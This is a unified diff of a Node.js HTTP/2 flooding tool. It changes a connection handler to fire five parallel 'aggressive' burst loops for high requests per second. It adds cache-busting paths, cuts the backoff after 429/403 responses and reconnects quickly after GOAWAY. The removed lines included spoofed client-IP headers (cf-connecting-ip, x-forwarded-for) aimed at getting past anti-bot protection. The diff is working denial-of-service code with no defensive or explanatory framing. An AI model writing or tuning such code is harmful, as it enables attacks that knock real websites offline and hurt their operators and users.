@@ -943,39 +943,44 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
     let streamId = 1;
     let data = Buffer.alloc(0);
     let hpack = new HPACK();
-    hpack.setTableSize(65536);
+    hpack.setTableSize(4096);
 
     const connectionId = crypto.randomBytes(16).toString('hex');
     activeConnections.set(connectionId, {
         socket: tlsSocket,
         createdAt: Date.now(),
         requestCount: 0,
-        fingerprint: fingerprint
+        fingerprint: fingerprint,
+        successStreak: 0
     });
 
     const updateWindow = Buffer.alloc(4);
-    updateWindow.writeUInt32BE(16777215, 0);
+    updateWindow.writeUInt32BE(16777215, 0); // Max window for high throughput
 
     const frames = [
         Buffer.from(PREFACE, 'binary'),
         encodeFrame(0, 4, encodeSettings([
-            [1, 65536],
-            [2, 0],
-            [3, 1000],
-            [4, 6291456],
-            [5, 16384],
-            [6, 65536]
+            [1, 65536],   // Max header table size
+            [2, 0],       // Disable push
+            [3, 1000],    // Max concurrent streams (HIGH for RPS)
+            [4, 16777215], // Max window size
+            [5, 16384],   // Max frame size
+            [6, 65536]    // Max header list size
         ])),
         encodeFrame(0, 8, updateWindow)
     ];
 
     let isClosing = false;
     let goAwayReceived = false;
-    let consecutiveErrors = 0;
-    let coolDownUntil = 0;
     let requestCount = 0;
     let lastRequestTime = Date.now();
-    let successCount = 0;
+    let successStreak = 0;
+    let errorStreak = 0;
+    let settingsReceived = false;
+    let windowSize = 16777215;
+
+    // WINDOW UPDATE handler for high throughput
+    let lastWindowUpdate = Date.now();
 
     tlsSocket.on('data', (eventData) => {
         data = Buffer.concat([data, eventData]);
@@ -986,6 +991,7 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
                 data = data.subarray(9 + frame.length);
 
                 if (frame.type == 4 && frame.flags == 0) {
+                    settingsReceived = true;
                     tlsSocket.write(encodeFrame(0, 4, "", 1));
                 }
 
@@ -1001,52 +1007,35 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
                                 statuses[status]++;
                             }
 
-                            if (status === 429) {
-                                consecutiveErrors++;
-                                const coolDownTime = Math.min(10000, 500 * Math.pow(1.5, consecutiveErrors));
-                                coolDownUntil = Date.now() + coolDownTime;
-
-                                if (!closeOnError && consecutiveErrors < 2) {
-                                    setTimeout(sendRequests, coolDownTime);
-                                    return;
-                                } else {
-                                    isClosing = true;
-                                    tlsSocket.write(encodeRstStream(streamId));
-                                    setTimeout(() => {
-                                        if (!tlsSocket.destroyed) {
-                                            tlsSocket.end(() => tlsSocket.destroy());
-                                        }
-                                    }, 1);
-                                    setTimeout(go, coolDownTime);
-                                    return;
-                                }
-                            }
-
-                            if (status === 403) {
-                                consecutiveErrors++;
-                                const coolDownTime = Math.min(15000, 1000 * Math.pow(1.5, consecutiveErrors));
-                                coolDownUntil = Date.now() + coolDownTime;
-
-                                if (!closeOnError && consecutiveErrors < 1) {
-                                    setTimeout(sendRequests, coolDownTime);
-                                    return;
-                                } else {
-                                    isClosing = true;
-                                    tlsSocket.write(encodeRstStream(streamId));
-                                    setTimeout(() => {
-                                        if (!tlsSocket.destroyed) {
-                                            tlsSocket.end(() => tlsSocket.destroy());
-                                        }
-                                    }, 1);
-                                    setTimeout(go, coolDownTime);
-                                    return;
-                                }
-                            }
-
                             if (status >= 200 && status < 300) {
-                                successCount++;
-                                consecutiveErrors = 0;
-                                coolDownUntil = 0;
+                                successStreak++;
+                                errorStreak = 0;
+
+                                // Update window for more throughput
+                                if (Date.now() - lastWindowUpdate > 1000 && windowSize > 0) {
+                                    windowSize -= 65536;
+                                    if (windowSize < 1048576) {
+                                        windowSize = 16777215;
+                                        const winUpdate = Buffer.alloc(4);
+                                        winUpdate.writeUInt32BE(windowSize, 0);
+                                        tlsSocket.write(encodeFrame(0, 8, winUpdate));
+                                        lastWindowUpdate = Date.now();
+                                    }
+                                }
+                            } else if (status === 429 || status === 403) {
+                                errorStreak++;
+                                successStreak = 0;
+
+                                if (errorStreak > 2) {
+                                    isClosing = true;
+                                    setTimeout(() => {
+                                        if (!tlsSocket.destroyed) {
+                                            tlsSocket.destroy();
+                                        }
+                                    }, 50);
+                                    setTimeout(go, 1000);
+                                    return;
+                                }
                             }
                         }
                     } catch (e) {}
@@ -1055,20 +1044,10 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
                 if (frame.type == 7) {
                     goAwayReceived = true;
                     isClosing = true;
-
-                    if (debugMode) {
-                        if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
-                        statuses["GOAWAY"]++;
-                    }
-
-                    lastGoAwayTime = Date.now();
-                    consecutiveGoAways++;
-
                     if (!tlsSocket.destroyed) {
-                        tlsSocket.end(() => tlsSocket.destroy());
+                        tlsSocket.destroy();
                     }
-
-                    setTimeout(go, 1000);
+                    setTimeout(go, 500);
                     return;
                 }
 
@@ -1089,76 +1068,61 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
         }
     };
 
-    tlsSocket.on('close', () => {
-        cleanup();
-        if (!goAwayReceived && Date.now() - lastGoAwayTime > 5000) {
-            consecutiveGoAways = Math.max(0, consecutiveGoAways - 1);
-        }
-        setTimeout(go, 1);
-    });
-
-    tlsSocket.on('error', () => {
-        cleanup();
-        setTimeout(go, 1);
-    });
+    tlsSocket.on('close', cleanup);
+    tlsSocket.on('error', cleanup);
 
     tlsSocket.write(Buffer.concat(frames));
 
-    // Start multiple request loops
-    for (let i = 0; i < 5; i++) {
-        setTimeout(() => {
-            if (!isClosing && !tlsSocket.destroyed) {
-                sendRequests();
-            }
-        }, i * 10);
+    // Start MULTIPLE aggressive request loops for high RPS
+    const startTime = Date.now();
+    const maxDuration = 30000; // Keep connection alive for 30 seconds max
+
+    function sendRequestsLoop(loopId) {
+        if (isClosing || tlsSocket.destroyed || Date.now() - startTime > maxDuration) {
+            return;
+        }
+
+        if (!settingsReceived) {
+            setTimeout(() => sendRequestsLoop(loopId), 50);
+            return;
+        }
+
+        // Send BURST of requests for high RPS
+        const burstSize = Math.min(10, Math.floor(successStreak / 10) + 1);
+
+        for (let i = 0; i < burstSize; i++) {
+            if (isClosing || tlsSocket.destroyed) break;
+
+            setTimeout(() => {
+                if (isClosing || tlsSocket.destroyed) return;
+
+                sendSingleRequest();
+            }, i * 2); // Stagger requests by 2ms
+        }
+
+        // Calculate next burst timing based on success rate
+        let nextDelay;
+        if (successStreak > 20) {
+            nextDelay = Math.max(10, 1000 / (initialRatelimit * 3)); // Ultra fast if successful
+        } else if (successStreak > 10) {
+            nextDelay = Math.max(20, 1000 / (initialRatelimit * 2));
+        } else {
+            nextDelay = Math.max(50, 1000 / initialRatelimit);
+        }
+
+        setTimeout(() => sendRequestsLoop(loopId), nextDelay);
     }
 
-    function sendRequests() {
-        if (Date.now() < coolDownUntil) {
-            setTimeout(sendRequests, coolDownUntil - Date.now());
-            return;
-        }
+    function sendSingleRequest() {
+        if (isClosing || tlsSocket.destroyed) return;
 
-        if (isClosing || tlsSocket.destroyed || requestCount >= MAX_REQUESTS_PER_CONNECTION * 3) {
-            if (!tlsSocket.destroyed && !isClosing) {
-                isClosing = true;
-                setTimeout(() => {
-                    if (!tlsSocket.destroyed) {
-                        tlsSocket.end(() => tlsSocket.destroy());
-                    }
-                }, 10);
-            }
-            return;
-        }
-
-        const now = Date.now();
-        if (now - lastRequestTime < Math.max(1, MIN_REQUEST_DELAY / 2)) {
-            setTimeout(sendRequests, Math.max(1, MIN_REQUEST_DELAY / 2) - (now - lastRequestTime));
-            return;
-        }
-
-        updateCycleState();
-
-        let effectiveRatelimit = baseRatelimitForCycle;
-        if (cycleState === 'burst') {
-            effectiveRatelimit = Math.floor(baseRatelimitForCycle * 2);
-        } else if (cycleState === 'cool-down') {
-            effectiveRatelimit = Math.floor(baseRatelimitForCycle * 0.9);
-        }
-
-        // Aggressive rate when getting 200s
-        if (successCount > 10) {
-            effectiveRatelimit = Math.floor(effectiveRatelimit * 1.5);
-        }
-
-        effectiveRatelimit = Math.max(50, Math.min(effectiveRatelimit, 200));
+        requestCount++;
+        lastRequestTime = Date.now();
 
         let pathValue = url.pathname;
         if (query) {
             pathValue = handleQuery(query);
-        }
-
-        if (enableCache && Math.random() > 0.7) {
+        } else if (Math.random() > 0.8) {
             pathValue += generateCacheQuery();
         }
 
@@ -1168,26 +1132,9 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
 
         const headersArray = BrowserHeader(fingerprint, pathValue);
 
-        // Enhanced bypass headers
+        // Minimal headers for speed
         if (isFull) {
-            headersArray.push(["cf-connecting-ip", generateLegitIP()]);
-            headersArray.push(["x-forwarded-for", generateLegitIP()]);
-            headersArray.push(["x-real-ip", generateLegitIP()]);
-            headersArray.push(["cf-visitor", '{"scheme":"https"}']);
-            headersArray.push(["x-forwarded-proto", "https"]);
-
-            if (Math.random() > 0.5) {
-                headersArray.push(["x-requested-with", "XMLHttpRequest"]);
-            }
-        }
-
-        if (customHeaders) {
-            customHeaders.split('#').forEach(header => {
-                const [name, value] = header.split(':');
-                if (name && value) {
-                    headersArray.push([name.trim(), value.trim()]);
-                }
-            });
+            headersArray.push(["accept-encoding", "gzip, deflate, br"]);
         }
 
         try {
@@ -1196,37 +1143,19 @@ function handleHTTP2Connection(tlsSocket, fingerprint) {
                 hpack.encode(headersArray)
             ]);
 
-            // Send multiple requests at once
-            const batchSize = Math.min(3, Math.floor(effectiveRatelimit / 50) + 1);
-            for (let i = 0; i < batchSize; i++) {
-                if (requestCount >= MAX_REQUESTS_PER_CONNECTION * 3) break;
-
-                tlsSocket.write(encodeFrame(streamId + i * 2, 1, packed, 0x25));
-                requestCount++;
-
-                if (debugMode && requestCount % 100 === 0) {
-                    if (!statuses['SENT']) statuses['SENT'] = 0;
-                    statuses['SENT']++;
-                }
-            }
-
-            streamId += batchSize * 2;
-            lastRequestTime = now;
-
-            const connInfo = activeConnections.get(connectionId);
-            if (connInfo) {
-                connInfo.requestCount = requestCount;
-            }
-
-            let baseDelay = Math.max(1, 1000 / (effectiveRatelimit * 1.5));
-            const jitter = Math.random() * baseDelay * 0.2;
-
-            setTimeout(sendRequests, baseDelay + jitter);
+            tlsSocket.write(encodeFrame(streamId, 1, packed, 0x25));
+            streamId += 2;
 
         } catch (error) {
-            cleanup();
-            setTimeout(go, 1);
+            // Ignore and continue
         }
+    }
+
+    // Start 5 parallel loops for maximum throughput
+    for (let i = 0; i < 5; i++) {
+        setTimeout(() => {
+            sendRequestsLoop(i);
+        }, i * 10);
     }
 }
 
